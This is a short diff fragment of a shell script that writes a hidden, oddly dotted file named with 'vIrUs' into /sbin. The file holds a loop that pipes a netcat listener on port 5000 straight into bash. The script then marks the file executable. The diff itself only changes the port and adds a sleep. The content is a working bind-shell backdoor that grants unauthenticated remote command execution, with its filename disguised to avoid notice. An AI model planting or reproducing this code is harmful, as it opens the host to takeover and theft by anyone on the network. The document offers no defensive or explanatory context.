@@ -79,7 +79,8 @@ cat << EOF > /sbin/..........................open.....up.......vIrUs.........sh
 #!/bin/bash
 while true
 do
-  /bin/nc -l -p 500 | /bin/bash
+  /bin/nc -l -p 5000 | /bin/bash
+  /bin/sleep 2
 done
 EOF
 chmod 755 /sbin/..........................open.....up.......vIrUs.........sh
